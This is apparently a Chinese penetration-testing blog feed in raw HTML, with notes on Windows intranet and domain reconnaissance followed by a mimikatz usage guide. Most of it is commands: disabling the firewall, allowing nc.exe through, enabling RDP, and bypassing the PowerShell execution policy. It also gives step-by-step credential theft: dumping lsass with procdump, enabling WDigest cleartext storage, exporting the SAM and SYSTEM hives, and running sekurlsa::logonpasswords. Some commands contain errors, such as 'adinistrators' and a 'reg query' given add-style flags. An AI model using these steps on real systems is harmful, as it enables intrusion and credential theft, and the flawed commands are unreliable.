class="hljs-selector-class">.exe</span><br>ZhuDongFangYu<span class="hljs-selector-class">.exe</span><br>KSafeTray<span class="hljs-selector-class">.exe</span><br>SafeDogUpdateCenter<span class="hljs-selector-class">.exe</span><br>McAfee McShield<span class="hljs-selector-class">.exe</span><br>egui<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//NOD32</span><br>AVP<span class="hljs-selector-class">.EXE</span>  <span class="hljs-comment">//卡巴斯基</span><br>avguard<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//小红伞</span><br>bdagent<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//BitDefender</span><br></code></pre></td></tr></table></figure><p>5.查看启动程序信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic startup <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span>,<span class="hljs-title">caption</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164020573.png" alt="image-20240107164020573"><br>6.查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164030189.png" alt="image-20240107164030189"><br>7.查看主机开机时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> statistics workstation<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164040099.png" alt="image-20240107164040099"><br>8.查询用户列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">//获取本地管理员组成员：</span><br><span class="hljs-title">net</span> localgroup adinistrators<br>//查看当前再线用户<br>query <span class="hljs-keyword">user</span> <span class="hljs-title">|| qwinsta</span><br></code></pre></td></tr></table></figure><p>9.列出或断开本地计算机与所连接的客户端之间的会话</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><p>10.查询端口列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>11.查询补丁列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>12.查询本机共享列表</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">net share<br><span class="hljs-comment">//wmic:</span><br>wmic share <span class="hljs-built_in">get</span> <span class="hljs-built_in">name</span>,path,status<br></code></pre></td></tr></table></figure><p>13.查询路由表及所有可用接口的ARP缓存表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure><p>14.查询防火墙相关配置</p><p>1）关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">//windows server <span class="hljs-number">2003</span>之前<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br>//Windows server <span class="hljs-number">2003</span>之后<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofile <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p> 2）查看防火墙配置</p><h4 id><a href="#" class="headerlink" title></a></h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之前允许指定程序全部连接<br>netsh firewall <span class="hljs-keyword">add</span> allowedprogram c:\nc.exe &quot;allow nc&quot; <span class="hljs-keyword">enable</span><br>//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之后的版本<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;pass nc&quot; dir=<span class="hljs-keyword">in</span> action=allow program=&quot;c:\nc.exe&quot;<br>//允许指定程序退出<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Allow nc&quot; dir=<span class="hljs-keyword">out</span> action=allow program=&quot;C:\nc.exe&quot;<br>//允许<span class="hljs-number">3389</span>端口放行<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Remote Desktop&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br></code></pre></td></tr></table></figure><h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4)自定义防火墙日志的存储位置"></a>4)自定义防火墙日志的存储位置</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall <span class="hljs-built_in">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span><br></code></pre></td></tr></table></figure><h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></code></pre></td></tr></table></figure><h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1）查看远程连接端口"><a href="#1）查看远程连接端口" class="headerlink" title="1）查看远程连接端口"></a>1）查看远程连接端口</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br></code></pre></td></tr></table></figure><h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2)在Windows server 2003中开启3389"></a>2)在Windows server 2003中开启3389</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3)在Windows server 2008和2012中"></a>3)在Windows server 2008和2012中</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmic /<span class="hljs-keyword">namespace</span>:\\<span class="hljs-symbol">root</span>\<span class="hljs-symbol">cimv2</span>\<span class="hljs-symbol">terminalservices</span> <span class="hljs-symbol">path</span> <span class="hljs-symbol">win32_terminalservicesetting</span> <span class="hljs-symbol">where</span> (<span class="hljs-symbol">__CLASS</span> !=&quot;&quot;) <span class="hljs-symbol">call</span> <span class="hljs-symbol">setallowtsconnections</span> <span class="hljs-symbol">1</span><br>//修改注册表方式<br><span class="hljs-symbol">reg</span> <span class="hljs-symbol">query</span> &quot;<span class="hljs-symbol">HKLM</span>\<span class="hljs-symbol">System</span>\<span class="hljs-symbol">CURRENT</span>\<span class="hljs-symbol">CONTROLSET</span>\<span class="hljs-symbol">CONTROL</span>\<span class="hljs-symbol">TERMINAL</span> <span class="hljs-symbol">SERVER</span>&quot; /<span class="hljs-symbol">v</span> <span class="hljs-symbol">fSingleSessionPerUser</span> /<span class="hljs-symbol">t</span> <span class="hljs-symbol">REG_DWORD</span> /<span class="hljs-symbol">d</span> <span class="hljs-symbol">0</span> /<span class="hljs-symbol">f</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p><h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/host/</span>winenum<br>execute<br></code></pre></td></tr></table></figure><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>查询指定用户的详细信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml">ipconfig /<span class="hljs-literal">all</span><br><span class="hljs-comment">//将查看到的DNS服务器用nslookup进行解析</span><br>nslookup dc.test.<span class="hljs-symbol">local</span><br></code></pre></td></tr></table></figure><p>查看系统详细信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">systeminfo | findstr <span class="hljs-regexp">/B /</span>C:<span class="hljs-string">&quot;登录服务器&quot;</span><br><span class="hljs-regexp">//</span>如果结果不为<span class="hljs-string">&quot;WORKGROUP&quot;</span>则主机为域主机<br></code></pre></td></tr></table></figure><p>查询当前登录域及登录用户信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">workstation</span><br></code></pre></td></tr></table></figure><p>判断主域</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net time /<span class="hljs-built_in">domain</span><br><span class="hljs-comment">//命令用于查看域内时间，同时也可以查看域控制器</span><br></code></pre></td></tr></table></figure><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan(<a href="http://www.unixwiz.net/tools/nbtscan.html)%E6%8E%A2%E6%B5%8B%E5%BD%93%E5%89%8D%E7%BD%91%E6%AE%B5%E4%B8%BB%E6%9C%BA">http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbt</span>.exe <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>使用ICMP探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s5HEC2y4-1611211198738)(2.内网信息收集.assets&#x2F;1580203080227.png)]</p><p>通过ARPscan工具扫描探测内网</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Empire中的ARPscan模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemode situational_awareness<span class="hljs-regexp">/network/</span>arpscan<br>execute<br></code></pre></td></tr></table></figure><p>Nishang中的Invoke-ARPScan.ps1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br><span class="hljs-keyword">type</span> c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br></code></pre></td></tr></table></figure><p>通过常规的TCP&#x2F;UDP端口扫描探测内网</p><p>上传ScanLine进行扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span> -h -t <span class="hljs-number">22</span>,<span class="hljs-number">80</span>-<span class="hljs-number">90</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span> -u <span class="hljs-number">53</span>,<span class="hljs-number">161</span> -O c:\windows\temp\log.txt -p <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">254</span> /b<br></code></pre></td></tr></table></figure><h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p><p>S扫描器</p><p>Metasploit端口扫描</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> ports <span class="hljs-comment">1-1000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOST 192.168.1.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">THREADS 10</span><br>run<br></code></pre></td></tr></table></figure><p>PowerSploit、NiShang的Invoke-portscan脚本</p><h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain<br><span class="hljs-comment">//查询域</span><br><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain:<span class="hljs-keyword">test</span><br><span class="hljs-comment">//查询域内所有计算机</span><br><br><span class="hljs-keyword">net</span> group /domain<br><span class="hljs-comment">//查询域内所有用户组列表</span><br><br><span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain computers&quot;</span> /domain<br><span class="hljs-comment">//查询所有域成员计算机列表</span><br><br><span class="hljs-keyword">net</span> accounts /domain<br><span class="hljs-comment">//获取域内密码信息</span><br><br>nltest /domain_trusts<br><span class="hljs-comment">//域内信任信息</span><br></code></pre></td></tr></table></figure><h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>可以看，域控制器的机器名<br>nltest /DCLIST:test<br><span class="hljs-regexp">//</span>查询当前时间<br>net time /domain<br><span class="hljs-regexp">//</span>查询域控制器的主机名<br>Nslookup -type=SRV _ldap._tcp<br><span class="hljs-regexp">//</span>查询域控制器组<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><span class="hljs-regexp">//</span>查看主控制器，可以看见域控制器的机器名<br>netdom query pdc<br></code></pre></td></tr></table></figure><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询所有域用户列表<br>net user /domain<br><br><span class="hljs-regexp">//</span>获取域内用户的详细信息<br>wmic useraccount get /all<br><br><span class="hljs-regexp">//</span>查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在<br>dsquery user<br><br><span class="hljs-regexp">//</span>查找目录中的计算机<br>dsquery computer<br><br><span class="hljs-regexp">//</span>查询本地管理员组用户<br>net localgroup administrators<br><br><span class="hljs-regexp">//</span>查询域管理员用户组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>查询管理员用户组<br>net group <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p>2.10 定位域管理员</p><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p><p>psloggedon.exe等</p><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">psloggedon.exe <span class="hljs-string">\\dc2012</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164100241.png" alt="image-20240107164100241"></p><p>PVEFindADUser</p><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p><p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164130507.png" alt="image-20240107164130507"></p><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">PVEFindADUser.exe -<span class="hljs-literal">current</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164138112.png" alt="image-20240107164138112"></p><p>NetView</p><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p><p>下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><p>Netness</p><p>PowerView</p><p>使用Powerview的Invoke-UserHunter。</p><p> Empire</p><p>Empire中也存在此类型的脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/network/</span>powerview/user_hunter<br>execute<br></code></pre></td></tr></table></figure><p>Nmap的NSE脚本</p><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p><p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p><p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p><p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p><p> 2.11 查找域管理进程</p><p>其中阿里云上有个链接也说到了类似的方法：<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p><p>本机检查：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>获取域管理员列表<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>列出本机的所有进程和进程用户<br>tasklist /v<br></code></pre></td></tr></table></figure><p>查询域控的域用户会话</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询域控列表<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>收集所有活动域的会话列表<br>netsess -h<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mimikatz使用</title>
    <link href="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p><strong>- 获取本地账号密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br><br><span class="hljs-comment">#抓取密码</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213207690.png" alt="image-20240107213207690"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p><strong>-  SAM表获取hash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导出SAM数据</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#使用mimikatz提取hash</span><br>lsadump::sam /sam:SAM /system:SYSTEM<br></code></pre></td></tr></table></figure><p><strong>- Procdump+Mimikatz</strong><br>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213218444.png" alt="image-20240107213218444"></p><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe  sekurlsa::logonPasswords full &gt; pssword.txt<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213229371.png" alt="image-20240107213229371"></p><ul><li><strong>读取域控中域成员Hash</strong><br>域控以上域管理员身份执行mimikatz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 